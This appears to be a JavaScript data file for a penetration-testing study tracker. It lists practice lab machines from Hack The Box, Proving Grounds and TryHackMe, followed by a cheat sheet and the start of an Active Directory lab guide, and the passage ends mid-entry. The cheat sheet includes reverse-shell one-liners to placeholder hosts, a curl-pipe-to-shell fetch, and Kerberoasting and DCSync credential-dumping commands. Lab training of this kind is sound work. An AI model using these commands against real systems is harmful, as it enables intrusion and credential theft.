'use strict';

const MACHINES = [
  {id:1,  name:"Lame",          platform:"HTB",os:"Linux",  diff:"Easy",  tags:["smb","samba"],                         url:"https://app.hackthebox.com/machines/Lame"},
  {id:2,  name:"Legacy",        platform:"HTB",os:"Windows",diff:"Easy",  tags:["ms08-067","smb"],                      url:"https://app.hackthebox.com/machines/Legacy"},
  {id:3,  name:"Devel",         platform:"HTB",os:"Windows",diff:"Easy",  tags:["ftp","iis","meterpreter"],             url:"https://app.hackthebox.com/machines/Devel"},
  {id:4,  name:"Optimum",       platform:"HTB",os:"Windows",diff:"Easy",  tags:["hfs","rejetto"],                       url:"https://app.hackthebox.com/machines/Optimum"},
  {id:5,  name:"Netmon",        platform:"HTB",os:"Windows",diff:"Easy",  tags:["prtg","cve"],                          url:"https://app.hackthebox.com/machines/Netmon"},
  {id:6,  name:"Jerry",         platform:"HTB",os:"Windows",diff:"Easy",  tags:["tomcat","upload"],                     url:"https://app.hackthebox.com/machines/Jerry"},
  {id:7,  name:"Blue",          platform:"HTB",os:"Windows",diff:"Easy",  tags:["ms17-010","eternalblue"],              url:"https://app.hackthebox.com/machines/Blue"},
  {id:8,  name:"Bounty",        platform:"HTB",os:"Windows",diff:"Medium",tags:["iis","upload","token-impersonation"],  url:"https://app.hackthebox.com/machines/Bounty"},
  {id:9,  name:"Chatterbox",    platform:"HTB",os:"Windows",diff:"Medium",tags:["achat","privesc"],                     url:"https://app.hackthebox.com/machines/Chatterbox"},
  {id:10, name:"Jeeves",        platform:"HTB",os:"Windows",diff:"Medium",tags:["jenkins","keepass","token"],           url:"https://app.hackthebox.com/machines/Jeeves"},
  {id:11, name:"Active",        platform:"HTB",os:"Windows",diff:"Medium",tags:["kerberoasting","ad","gpp"],            url:"https://app.hackthebox.com/machines/Active",        isAD:true},
  {id:12, name:"Forest",        platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","as-rep-roasting","dcsync"],       url:"https://app.hackthebox.com/machines/Forest",        isAD:true},
  {id:13, name:"Sauna",         platform:"HTB",os:"Windows",diff:"Easy",  tags:["ad","as-rep-roasting","winpeas"],      url:"https://app.hackthebox.com/machines/Sauna",         isAD:true},
  {id:14, name:"Monteverde",    platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","azure-ad","ldap"],                url:"https://app.hackthebox.com/machines/Monteverde",    isAD:true},
  {id:15, name:"Resolute",      platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","dns-admin","dll-injection"],      url:"https://app.hackthebox.com/machines/Resolute",      isAD:true},
  {id:16, name:"Escape",        platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","mssql","silver-ticket"],          url:"https://app.hackthebox.com/machines/Escape",        isAD:true},
  {id:17, name:"Return",        platform:"HTB",os:"Windows",diff:"Easy",  tags:["ldap","printer","service-abuse"],      url:"https://app.hackthebox.com/machines/Return"},
  {id:18, name:"Timelapse",     platform:"HTB",os:"Windows",diff:"Easy",  tags:["ad","laps","winrm"],                   url:"https://app.hackthebox.com/machines/Timelapse",     isAD:true},
  {id:19, name:"Sniper",        platform:"HTB",os:"Windows",diff:"Medium",tags:["rfi","lfi","chm"],                     url:"https://app.hackthebox.com/machines/Sniper"},
  {id:20, name:"Artic",         platform:"HTB",os:"Windows",diff:"Medium",tags:["coldfusion","upload"],                 url:"https://app.hackthebox.com/machines/Artic"},
  {id:21, name:"Blunder",       platform:"HTB",os:"Linux",  diff:"Easy",  tags:["bludit","cms","suid"],                 url:"https://app.hackthebox.com/machines/Blunder"},
  {id:22, name:"OpenAdmin",     platform:"HTB",os:"Linux",  diff:"Easy",  tags:["opennetadmin","rce","ssh-key"],        url:"https://app.hackthebox.com/machines/OpenAdmin"},
  {id:23, name:"Horizontall",   platform:"HTB",os:"Linux",  diff:"Easy",  tags:["strapi","rce","laravel"],              url:"https://app.hackthebox.com/machines/Horizontall"},
  {id:24, name:"Traverxec",     platform:"HTB",os:"Linux",  diff:"Easy",  tags:["nostromo","rce","sudo"],               url:"https://app.hackthebox.com/machines/Traverxec"},
  {id:25, name:"Mirai",         platform:"HTB",os:"Linux",  diff:"Easy",  tags:["raspberry-pi","default-creds"],        url:"https://app.hackthebox.com/machines/Mirai"},
  {id:26, name:"Cronos",        platform:"HTB",os:"Linux",  diff:"Medium",tags:["dns","sqli","cron"],                   url:"https://app.hackthebox.com/machines/Cronos"},
  {id:27, name:"Nineveh",       platform:"HTB",os:"Linux",  diff:"Medium",tags:["lfi","phpinfo","knockd"],              url:"https://app.hackthebox.com/machines/Nineveh"},
  {id:28, name:"Bastard",       platform:"HTB",os:"Windows",diff:"Medium",tags:["drupal","drupalgeddon"],               url:"https://app.hackthebox.com/machines/Bastard"},
  {id:29, name:"Buff",          platform:"HTB",os:"Windows",diff:"Easy",  tags:["gym-management","bof","tunnel"],       url:"https://app.hackthebox.com/machines/Buff"},
  {id:30, name:"Blackfield",    platform:"HTB",os:"Windows",diff:"Hard",  tags:["ad","as-rep-roasting","dcsync","lsass"],url:"https://app.hackthebox.com/machines/Blackfield",  isAD:true},
  {id:31, name:"Flight",        platform:"HTB",os:"Windows",diff:"Hard",  tags:["ad","smb","ntlm-relay","iis"],         url:"https://app.hackthebox.com/machines/Flight",        isAD:true},
  {id:32, name:"Sizzle",        platform:"HTB",os:"Windows",diff:"Hard",  tags:["ad","ldap","certifried","kerberoasting"],url:"https://app.hackthebox.com/machines/Sizzle",    isAD:true},
  {id:33, name:"Authority",     platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","ansible","adcs"],                 url:"https://app.hackthebox.com/machines/Authority",     isAD:true},
  {id:34, name:"Manager",       platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","adcs","mssql"],                   url:"https://app.hackthebox.com/machines/Manager",       isAD:true},
  {id:35, name:"Querier",       platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","mssql","xlsm","gpp-password"],    url:"https://app.hackthebox.com/machines/Querier",       isAD:true},
  {id:36, name:"Bastion",       platform:"HTB",os:"Windows",diff:"Easy",  tags:["vhd","registry","secretsdump"],        url:"https://app.hackthebox.com/machines/Bastion"},
  {id:37, name:"Loly",          platform:"PG", os:"Linux",  diff:"Medium",tags:["wordpress","upload"],                  url:"https://portal.offsec.com/machine/loly-532/overview"},
  {id:38, name:"Potato",        platform:"PG", os:"Linux",  diff:"Medium",tags:["php","sudo"],                          url:"https://portal.offsec.com/machine/potato-445/overview"},
  {id:39, name:"Gaara",         platform:"PG", os:"Linux",  diff:"Easy",  tags:["enumeration","privesc"],               url:"https://portal.offsec.com/machine/gaara-664/overview"},
  {id:40, name:"BBScute",       platform:"PG", os:"Linux",  diff:"Medium",tags:["cms","suid"],                          url:"https://portal.offsec.com/machine/bbscute-579/overview"},
  {id:41, name:"Blogger",       platform:"PG", os:"Linux",  diff:"Hard",  tags:["wordpress","lxd"],                    url:"https://portal.offsec.com/machine/blogger-40267/overview"},
  {id:42, name:"Stapler",       platform:"PG", os:"Linux",  diff:"Hard",  tags:["ftp","smb","wordpress"],               url:"https://portal.offsec.com/machine/stapler-15769/overview"},
  {id:43, name:"Amaterasu",     platform:"PG", os:"Linux",  diff:"Hard",  tags:["snmp","ftp-exploit"],                  url:"https://portal.offsec.com/machine/amaterasu-49068/overview"},
  {id:44, name:"Butch",         platform:"PG", os:"Windows",diff:"Hard",  tags:["sqli","bof"],                          url:"https://portal.offsec.com/machine/butch-299/overview"},
  {id:45, name:"Nickel",        platform:"PG", os:"Windows",diff:"Hard",  tags:["dotnet","service-exploit"],            url:"https://portal.offsec.com/machine/nickel-452/overview"},
  {id:46, name:"Vault",         platform:"PG", os:"Windows",diff:"Hard",  tags:["ad","dpapi","secretsdump"],            url:"https://portal.offsec.com/machine/vault-33015/overview",           isAD:true},
  {id:47, name:"Hutch",         platform:"PG", os:"Windows",diff:"Medium",tags:["ad","laps","ldap"],                    url:"https://portal.offsec.com/machine/hutch-604/overview",           isAD:true},
  {id:48, name:"Heist",         platform:"PG", os:"Windows",diff:"Medium",tags:["cisco","hash","winrm"],                url:"https://portal.offsec.com/machine/heist-27692/overview"},
  {id:49, name:"Slort",         platform:"PG", os:"Windows",diff:"Medium",tags:["rfi","service-hijack"],                url:"https://portal.offsec.com/machine/slort-269/overview"},
  {id:50, name:"Wombo",         platform:"PG", os:"Linux",  diff:"Easy",  tags:["redis","rce"],                         url:"https://portal.offsec.com/machine/wombo-219/overview"},
  {id:51, name:"Nibbles",       platform:"PG", os:"Linux",  diff:"Medium",tags:["mysql","binary-exploit"],              url:"https://portal.offsec.com/machine/nibbles-209/overview"},
  {id:52, name:"Fanatastic",    platform:"PG", os:"Linux",  diff:"Hard",  tags:["cron","privesc"],                      url:"https://portal.offsec.com/machine/fanatastic-37029/overview"},
  {id:53, name:"Mr Robot",      platform:"THM",os:"Linux",  diff:"Medium",tags:["wordpress","nmap","hydra"],            url:"https://tryhackme.com/room/mrrobot"},
  {id:54, name:"Overpass",      platform:"THM",os:"Linux",  diff:"Easy",  tags:["custom-auth","cron","rce"],            url:"https://tryhackme.com/room/overpass"},
  {id:55, name:"Internal",      platform:"THM",os:"Linux",  diff:"Hard",  tags:["wordpress","pivoting","jenkins"],      url:"https://tryhackme.com/room/internal"},
  {id:56, name:"Relevant",      platform:"THM",os:"Windows",diff:"Medium",tags:["smb","token-impersonation","ms17-010"],url:"https://tryhackme.com/room/relevant"},
  {id:57, name:"Skynet",        platform:"THM",os:"Linux",  diff:"Easy",  tags:["smb","email","rfi"],                   url:"https://tryhackme.com/room/skynet"},
  {id:58, name:"Daily Bugle",   platform:"THM",os:"Linux",  diff:"Hard",  tags:["joomla","sqli","yum"],                 url:"https://tryhackme.com/room/dailybugle"},
  {id:59, name:"Cicada",        platform:"HTB",os:"Windows",diff:"Easy",  tags:["ad","ldap","enumeration"],             url:"https://app.hackthebox.com/machines/Cicada",        isAD:true},
  {id:60, name:"Administrator", platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","ftp","acl-abuse","adcs"],         url:"https://app.hackthebox.com/machines/Administrator",  isAD:true},

  // HTB Linux
  {id:61,  name:"Sea",          platform:"HTB",os:"Linux",  diff:"Easy",  tags:["wondercms","xss","rce"],                    url:"https://app.hackthebox.com/machines/Sea"},
  {id:62,  name:"Nibbles",      platform:"HTB",os:"Linux",  diff:"Easy",  tags:["nibbleblog","cms","upload"],                url:"https://app.hackthebox.com/machines/Nibbles"},
  {id:63,  name:"SolidState",   platform:"HTB",os:"Linux",  diff:"Medium",tags:["pop3","rbash","cron"],                      url:"https://app.hackthebox.com/machines/SolidState"},
  {id:64,  name:"Poison",       platform:"HTB",os:"Linux",  diff:"Medium",tags:["lfi","log-poisoning","vnc"],                url:"https://app.hackthebox.com/machines/Poison"},
  {id:65,  name:"Editor",       platform:"HTB",os:"Linux",  diff:"Medium",tags:["rce","privesc"],                            url:"https://app.hackthebox.com/machines/Editor"},
  {id:66,  name:"Sunday",       platform:"HTB",os:"Linux",  diff:"Easy",  tags:["finger","snmp","sudo"],                    url:"https://app.hackthebox.com/machines/Sunday"},
  {id:67,  name:"Keeper",       platform:"HTB",os:"Linux",  diff:"Easy",  tags:["request-tracker","keepass","ssh-key"],     url:"https://app.hackthebox.com/machines/Keeper"},
  {id:68,  name:"Pilgrimage",   platform:"HTB",os:"Linux",  diff:"Easy",  tags:["git","imagemagick","cve"],                 url:"https://app.hackthebox.com/machines/Pilgrimage"},
  {id:69,  name:"CozyHosting",  platform:"HTB",os:"Linux",  diff:"Easy",  tags:["spring-boot","rce","postgres"],            url:"https://app.hackthebox.com/machines/CozyHosting"},
  {id:70,  name:"Codify",       platform:"HTB",os:"Linux",  diff:"Easy",  tags:["nodejs","vm-escape","mysql"],              url:"https://app.hackthebox.com/machines/Codify"},
  {id:71,  name:"TartarSauce",  platform:"HTB",os:"Linux",  diff:"Medium",tags:["wordpress","webmin","sudo"],               url:"https://app.hackthebox.com/machines/TartarSauce"},
  {id:72,  name:"Jarvis",       platform:"HTB",os:"Linux",  diff:"Medium",tags:["sqli","phpmyadmin","sudo"],                url:"https://app.hackthebox.com/machines/Jarvis"},
  {id:73,  name:"Tabby",        platform:"HTB",os:"Linux",  diff:"Easy",  tags:["lfi","tomcat","lxd"],                      url:"https://app.hackthebox.com/machines/Tabby"},
  {id:74,  name:"Usage",        platform:"HTB",os:"Linux",  diff:"Easy",  tags:["sqli","cms","wildcard-injection"],         url:"https://app.hackthebox.com/machines/Usage"},
  {id:75,  name:"Mentor",       platform:"HTB",os:"Linux",  diff:"Medium",tags:["snmp","api","docker"],                     url:"https://app.hackthebox.com/machines/Mentor"},
  {id:76,  name:"Devvortex",    platform:"HTB",os:"Linux",  diff:"Easy",  tags:["joomla","cve","mysql"],                    url:"https://app.hackthebox.com/machines/Devvortex"},
  {id:77,  name:"Irked",        platform:"HTB",os:"Linux",  diff:"Easy",  tags:["irc","backdoor","steganography"],          url:"https://app.hackthebox.com/machines/Irked"},
  {id:78,  name:"Popcorn",      platform:"HTB",os:"Linux",  diff:"Medium",tags:["upload","rce","motd"],                     url:"https://app.hackthebox.com/machines/Popcorn"},
  {id:79,  name:"Bashed",       platform:"HTB",os:"Linux",  diff:"Easy",  tags:["webshell","sudo","cron"],                  url:"https://app.hackthebox.com/machines/Bashed"},
  {id:80,  name:"Broker",       platform:"HTB",os:"Linux",  diff:"Easy",  tags:["activemq","cve","sudo"],                   url:"https://app.hackthebox.com/machines/Broker"},
  {id:81,  name:"Silentium",    platform:"HTB",os:"Linux",  diff:"Medium",tags:["enumeration","privesc"],                   url:"https://app.hackthebox.com/machines/Silentium"},
  {id:82,  name:"Networked",    platform:"HTB",os:"Linux",  diff:"Easy",  tags:["upload","php","sudo"],                     url:"https://app.hackthebox.com/machines/Networked"},
  {id:83,  name:"UpDown",       platform:"HTB",os:"Linux",  diff:"Medium",tags:["upload","php","sudo"],                     url:"https://app.hackthebox.com/machines/UpDown"},
  {id:84,  name:"Swagshop",     platform:"HTB",os:"Linux",  diff:"Easy",  tags:["magento","rce","sudo"],                    url:"https://app.hackthebox.com/machines/Swagshop"},
  {id:85,  name:"Pandora",      platform:"HTB",os:"Linux",  diff:"Easy",  tags:["snmp","sqli","pam"],                       url:"https://app.hackthebox.com/machines/Pandora"},
  {id:86,  name:"Precious",     platform:"HTB",os:"Linux",  diff:"Easy",  tags:["pdfkit","rce","ruby"],                     url:"https://app.hackthebox.com/machines/Precious"},
  {id:87,  name:"Busqueda",     platform:"HTB",os:"Linux",  diff:"Easy",  tags:["gitea","git","docker"],                    url:"https://app.hackthebox.com/machines/Busqueda"},
  {id:88,  name:"Monitored",    platform:"HTB",os:"Linux",  diff:"Medium",tags:["nagios","snmp","api"],                     url:"https://app.hackthebox.com/machines/Monitored"},
  {id:89,  name:"BoardLight",   platform:"HTB",os:"Linux",  diff:"Easy",  tags:["dolibarr","cms","suid"],                   url:"https://app.hackthebox.com/machines/BoardLight"},
  {id:90,  name:"Magic",        platform:"HTB",os:"Linux",  diff:"Medium",tags:["upload","sqli","suid"],                    url:"https://app.hackthebox.com/machines/Magic"},
  {id:91,  name:"Help",         platform:"HTB",os:"Linux",  diff:"Easy",  tags:["helpdeskz","sqli","rce"],                  url:"https://app.hackthebox.com/machines/Help"},
  {id:92,  name:"Editorial",    platform:"HTB",os:"Linux",  diff:"Easy",  tags:["ssrf","git","rce"],                        url:"https://app.hackthebox.com/machines/Editorial"},

  // HTB Windows
  {id:93,  name:"Markup",       platform:"HTB",os:"Windows",diff:"Easy",  tags:["xxe","logon-script"],                      url:"https://app.hackthebox.com/machines/Markup"},
  {id:94,  name:"Servmon",      platform:"HTB",os:"Windows",diff:"Easy",  tags:["nvms","ftp","port-forward"],               url:"https://app.hackthebox.com/machines/Servmon"},
  {id:95,  name:"Giddy",        platform:"HTB",os:"Windows",diff:"Medium",tags:["xss","sqli","applocker"],                  url:"https://app.hackthebox.com/machines/Giddy"},
  {id:96,  name:"Remote",       platform:"HTB",os:"Windows",diff:"Easy",  tags:["umbraco","nfs","service-exploit"],         url:"https://app.hackthebox.com/machines/Remote"},
  {id:97,  name:"Love",         platform:"HTB",os:"Windows",diff:"Easy",  tags:["ssrf","upload","alwaysinstallelevated"],   url:"https://app.hackthebox.com/machines/Love"},
  {id:98,  name:"SecNotes",     platform:"HTB",os:"Windows",diff:"Medium",tags:["sqli","smb","wsl"],                        url:"https://app.hackthebox.com/machines/SecNotes"},
  {id:99,  name:"Access",       platform:"HTB",os:"Windows",diff:"Easy",  tags:["mdb","pst","runas"],                       url:"https://app.hackthebox.com/machines/Access"},
  {id:100, name:"Mailing",      platform:"HTB",os:"Windows",diff:"Easy",  tags:["email","cve","msi"],                       url:"https://app.hackthebox.com/machines/Mailing"},
  {id:101, name:"Heist",        platform:"HTB",os:"Windows",diff:"Medium",tags:["cisco","hash","winrm"],                    url:"https://app.hackthebox.com/machines/Heist"},

  // HTB Active Directory
  {id:102, name:"TheFrizz",     platform:"HTB",os:"Windows",diff:"Hard",  tags:["ad","kerberos","acl-abuse"],               url:"https://app.hackthebox.com/machines/TheFrizz",      isAD:true},
  {id:103, name:"EscapeTwo",    platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","mssql","adcs","assumed-breach"],       url:"https://app.hackthebox.com/machines/EscapeTwo",     isAD:true},
  {id:104, name:"Certified",    platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","adcs","acl-abuse"],                   url:"https://app.hackthebox.com/machines/Certified",     isAD:true},
  {id:105, name:"Puppy",        platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","ldap","smb"],                         url:"https://app.hackthebox.com/machines/Puppy",         isAD:true},
  {id:106, name:"Signed",       platform:"HTB",os:"Windows",diff:"Medium",tags:["ad","smb-signing","ntlm-relay"],           url:"https://app.hackthebox.com/machines/Signed",        isAD:true},

  // PG Linux
  {id:107, name:"ClamAV",       platform:"PG", os:"Linux",  diff:"Easy",  tags:["smtp","rce"],                              url:"https://portal.offsec.com/machine/clamav-179/overview"},
  {id:108, name:"Pelican",      platform:"PG", os:"Linux",  diff:"Easy",  tags:["exhibitor","sudo"],                        url:"https://portal.offsec.com/machine/pelican-440/overview"},
  {id:109, name:"Payday",       platform:"PG", os:"Linux",  diff:"Easy",  tags:["lfi","privesc"],                           url:"https://portal.offsec.com/machine/payday-164/overview"},
  {id:110, name:"Snookums",     platform:"PG", os:"Linux",  diff:"Easy",  tags:["php","mysql","rce"],                       url:"https://portal.offsec.com/machine/snookums-294/overview"},
  {id:111, name:"Bratarina",    platform:"PG", os:"Linux",  diff:"Easy",  tags:["smtp","rce"],                              url:"https://portal.offsec.com/machine/bratarina-159/overview"},
  {id:112, name:"Pebbles",      platform:"PG", os:"Linux",  diff:"Medium",tags:["lfi","cms","privesc"],                     url:"https://portal.offsec.com/machine/pebbles-304/overview"},
  {id:113, name:"Hetemit",      platform:"PG", os:"Linux",  diff:"Easy",  tags:["python","rce","sudo"],                     url:"https://portal.offsec.com/machine/hetemit-527/overview"},
  {id:114, name:"ZenPhoto",     platform:"PG", os:"Linux",  diff:"Easy",  tags:["cms","sqli","rce"],                        url:"https://portal.offsec.com/machine/zenphoto-174/overview"},
  {id:115, name:"Nukem",        platform:"PG", os:"Linux",  diff:"Hard",  tags:["wordpress","smtp","privesc"],              url:"https://portal.offsec.com/machine/nukem-457/overview"},
  {id:116, name:"Cockpit",      platform:"PG", os:"Linux",  diff:"Easy",  tags:["rce","privesc"],                           url:"https://portal.offsec.com/machine/cockpit-49474/overview"},
  {id:117, name:"Clue",         platform:"PG", os:"Linux",  diff:"Hard",  tags:["cassandra","mail","rce"],                  url:"https://portal.offsec.com/machine/clue-43691/overview"},
  {id:118, name:"Extplorer",    platform:"PG", os:"Linux",  diff:"Easy",  tags:["cms","upload","suid"],                     url:"https://portal.offsec.com/machine/extplorer-49489/overview"},
  {id:119, name:"Postfish",     platform:"PG", os:"Linux",  diff:"Hard",  tags:["smtp","phishing","docker"],                url:"https://portal.offsec.com/machine/postfish-639/overview"},
  {id:120, name:"Hawat",        platform:"PG", os:"Linux",  diff:"Easy",  tags:["php","sqli","privesc"],                    url:"https://portal.offsec.com/machine/hawat-15710/overview"},
  {id:121, name:"Walla",        platform:"PG", os:"Linux",  diff:"Medium",tags:["rce","service-exploit"],                   url:"https://portal.offsec.com/machine/walla-619/overview"},
  {id:122, name:"PC",           platform:"PG", os:"Linux",  diff:"Easy",  tags:["grpc","sqli","privesc"],                   url:"https://portal.offsec.com/machine/pc-52193/overview"},
  {id:123, name:"Apex",         platform:"PG", os:"Linux",  diff:"Medium",tags:["openemr","sqli","rce"],                    url:"https://portal.offsec.com/machine/apex-15705/overview"},
  {id:124, name:"Sorcerer",     platform:"PG", os:"Linux",  diff:"Hard",  tags:["zip","suid","ssh"],                        url:"https://portal.offsec.com/machine/sorcerer-472/overview"},
  {id:125, name:"Sybaris",      platform:"PG", os:"Linux",  diff:"Medium",tags:["udf","mysql","privesc"],                   url:"https://portal.offsec.com/machine/sybaris-430/overview"},
  {id:126, name:"Peppo",        platform:"PG", os:"Linux",  diff:"Hard",  tags:["docker","privesc"],                        url:"https://portal.offsec.com/machine/peppo-249/overview"},
  {id:127, name:"Hunit",        platform:"PG", os:"Linux",  diff:"Medium",tags:["rce","privesc"],                           url:"https://portal.offsec.com/machine/hunit-574/overview"},
  {id:128, name:"Readys",       platform:"PG", os:"Linux",  diff:"Medium",tags:["redis","cron","privesc"],                  url:"https://portal.offsec.com/machine/readys-32746/overview"},
  {id:129, name:"Astronaut",    platform:"PG", os:"Linux",  diff:"Easy",  tags:["grav-cms","rce","privesc"],                url:"https://portal.offsec.com/machine/astronaut-49479/overview"},
  {id:130, name:"Bullybox",     platform:"PG", os:"Linux",  diff:"Medium",tags:["sqli","rce","privesc"],                    url:"https://portal.offsec.com/machine/bullybox-52203/overview"},
  {id:131, name:"Marketing",    platform:"PG", os:"Linux",  diff:"Easy",  tags:["rce","privesc"],                           url:"https://portal.offsec.com/machine/marketing-40967/overview"},
  {id:132, name:"Exfiltrated",  platform:"PG", os:"Linux",  diff:"Medium",tags:["subrion","rce","cron"],                    url:"https://portal.offsec.com/machine/exfiltrated-17398/overview"},
  {id:133, name:"QuackerJack",  platform:"PG", os:"Linux",  diff:"Medium",tags:["beanstalkd","rce","suid"],                 url:"https://portal.offsec.com/machine/quackerjack-274/overview"},
  {id:134, name:"Flu",          platform:"PG", os:"Linux",  diff:"Easy",  tags:["confluence","rce","privesc"],              url:"https://portal.offsec.com/machine/flu-150748/overview"},
  {id:135, name:"Roquefort",    platform:"PG", os:"Linux",  diff:"Easy",  tags:["git","privesc"],                           url:"https://portal.offsec.com/machine/roquefort-229/overview"},
  {id:136, name:"Levram",       platform:"PG", os:"Linux",  diff:"Easy",  tags:["grav-cms","rce","privesc"],                url:"https://portal.offsec.com/machine/levram-50411/overview"},
  {id:137, name:"Mzeeav",       platform:"PG", os:"Linux",  diff:"Easy",  tags:["upload","privesc"],                        url:"https://portal.offsec.com/machine/mzeeav-150716/overview"},
  {id:138, name:"LaVita",       platform:"PG", os:"Linux",  diff:"Medium",tags:["laravel","rce","privesc"],                 url:"https://portal.offsec.com/machine/lavita-150736/overview"},
  {id:139, name:"Xposedapi",    platform:"PG", os:"Linux",  diff:"Easy",  tags:["api","rce","privesc"],                     url:"https://portal.offsec.com/machine/xposedapi-624/overview"},
  {id:140, name:"Zipper",       platform:"PG", os:"Linux",  diff:"Easy",  tags:["zip","privesc"],                           url:"https://portal.offsec.com/machine/zipper-42231/overview"},

  // PG Windows
  {id:141, name:"Kevin",        platform:"PG", os:"Windows",diff:"Easy",  tags:["hfs","privesc"],                           url:"https://portal.offsec.com/machine/kevin-189/overview"},
  {id:142, name:"Internal",     platform:"PG", os:"Windows",diff:"Easy",  tags:["mssql","ftp","privesc"],                   url:"https://portal.offsec.com/machine/internal-169/overview"},
  {id:143, name:"Algernon",     platform:"PG", os:"Windows",diff:"Easy",  tags:["sftp","rce","privesc"],                    url:"https://portal.offsec.com/machine/algernon-239/overview"},
  {id:144, name:"Jacko",        platform:"PG", os:"Windows",diff:"Medium",tags:["h2","rce","privesc"],                      url:"https://portal.offsec.com/machine/jacko-264/overview"},
  {id:145, name:"Craft",        platform:"PG", os:"Windows",diff:"Easy",  tags:["mdb","rce","privesc"],                     url:"https://portal.offsec.com/machine/craft-28375/overview"},
  {id:146, name:"Squid",        platform:"PG", os:"Windows",diff:"Medium",tags:["squid-proxy","privesc"],                   url:"https://portal.offsec.com/machine/squid-38173/overview"},
  {id:147, name:"MedJed",       platform:"PG", os:"Windows",diff:"Easy",  tags:["cms","rce","privesc"],                     url:"https://portal.offsec.com/machine/medjed-589/overview"},
  {id:148, name:"Billyboss",    platform:"PG", os:"Windows",diff:"Medium",tags:["nexus","cve","privesc"],                   url:"https://portal.offsec.com/machine/billyboss-259/overview"},
  {id:149, name:"Shenzi",       platform:"PG", os:"Windows",diff:"Medium",tags:["wordpress","smb","privesc"],               url:"https://portal.offsec.com/machine/shenzi-284/overview"},
  {id:150, name:"AuthBy",       platform:"PG", os:"Windows",diff:"Easy",  tags:["ftp","php","privesc"],                     url:"https://portal.offsec.com/machine/authby-199/overview"},
  {id:151, name:"Hepet",        platform:"PG", os:"Windows",diff:"Medium",tags:["rce","privesc"],                           url:"https://portal.offsec.com/machine/hepet-11601/overview"},
  {id:152, name:"DVR4",         platform:"PG", os:"Windows",diff:"Medium",tags:["argus","cve","privesc"],                   url:"https://portal.offsec.com/machine/dvr4-36048/overview"},
  {id:153, name:"Mice",         platform:"PG", os:"Windows",diff:"Easy",  tags:["rce","privesc"],                           url:"https://portal.offsec.com/machine/mice-38178/overview"},
  {id:154, name:"Monster",      platform:"PG", os:"Windows",diff:"Medium",tags:["cms","sqli","privesc"],                    url:"https://portal.offsec.com/machine/monster-37024/overview"},
  {id:155, name:"Fish",         platform:"PG", os:"Windows",diff:"Medium",tags:["rce","privesc"],                           url:"https://portal.offsec.com/machine/fish-27733/overview"},

  // PG Active Directory & Networks
  {id:156, name:"Access",       platform:"PG", os:"Windows",diff:"Medium",tags:["ad","acl-abuse","bloodhound"],             url:"https://portal.offsec.com/machine/access-38168/overview",           isAD:true},
  {id:157, name:"Nagoya",       platform:"PG", os:"Windows",diff:"Medium",tags:["ad","ntlm-relay","ldap"],                  url:"https://portal.offsec.com/machine/nagoya-50426/overview",           isAD:true},
  {id:158, name:"Hokkaido",     platform:"PG", os:"Windows",diff:"Medium",tags:["ad","acl-abuse","kerberos"],               url:"https://portal.offsec.com/machine/hokkaido-150744/overview",           isAD:true},
  {id:159, name:"SkillForge",   platform:"PG", os:"Linux",  diff:"Medium",tags:["ad","web","privesc"],                      url:"https://portal.offsec.com/machine/skillforge-211143/overview",           isAD:true},
  {id:160, name:"Resourced",    platform:"PG", os:"Windows",diff:"Medium",tags:["ad","bloodhound","dcsync"],                url:"https://portal.offsec.com/machine/resourced-36043/overview",           isAD:true},
];

const DEFAULT_CHEATSHEET = [
  {id:1, title:"SMB enumeration",    tags:["smb","enum"],              content:"smbclient -L //<IP> -N\nnetexec smb <IP> -u '' -p '' --shares\nenum4linux-ng -A <IP>"},
  {id:2, title:"Kerberoasting",       tags:["ad","kerberos","impacket"],content:"impacket-GetUserSPNs <domain>/<user>:<pass> -dc-ip <IP> -request\nhashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt"},
  {id:3, title:"AS-REP roasting",     tags:["ad","kerberos"],           content:"impacket-GetNPUsers <domain>/ -usersfile users.txt -dc-ip <IP> -no-pass\nHashcat mode: -m 18200"},
  {id:4, title:"Token impersonation", tags:["windows","privesc","token"],content:"whoami /priv\n# SeImpersonatePrivilege:\nPrintSpoofer.exe -i -c cmd\nGodPotato.exe -cmd \"cmd /c whoami\""},
  {id:5, title:"Linux SUID abuse",    tags:["linux","privesc","suid"],  content:"find / -perm -4000 -type f 2>/dev/null\n# GTFOBins: https://gtfobins.github.io"},
  {id:6, title:"DCSync attack",       tags:["ad","dcsync","secretsdump"],content:"impacket-secretsdump <domain>/<user>:<pass>@<IP>\n# Needs: GetChangesAll + GetChanges rights\nimpacket-secretsdump -just-dc-ntlm <domain>/<user>@<IP>"},
  {id:7, title:"Reverse shells",      tags:["shell","rce"],             content:"# Bash:\nbash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'\n# PHP:\nphp -r '$s=fsockopen(\"<IP>\",<PORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\n# Python:\npython3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"<IP>\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'"},
  {id:8, title:"WinPEAS / LinPEAS",   tags:["enum","privesc","peas"],   content:"# LinPEAS:\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n# WinPEAS:\niwr -uri http://<your-ip>/winPEASx64.exe -outfile wp.exe; .\\wp.exe"},
];

const AD_LAB = [
  {
    id:"enum-ldap", name:"1. LDAP / BloodHound Enumeration",
    desc:"Always your first step. Map the entire domain before touching anything.",
    cmd:`ldapdomaindump <DC-IP> -u '<domain>\\<user>' -p '<pass>'
netexec ldap <DC-IP> -u '' -p ''
netexec ldap <DC-IP> -u <user> -p <pass> --users --groups

# BloodHound collection:
bloodhound-python -u <user> -p <pass> -d <domain> -dc <DC-IP> -c All --zip

# Key BloodHound queries:
# - Shortest Paths to Domain Admins
# - Find Principals with DCSync Rights
# - Find all Kerberoastable Users`,
  },
  {
    id:"kerb-roast", name:"2. Kerberoasting",
    desc:"Request TGS tickets for SPN accounts. Crack offline. No special privs needed.",
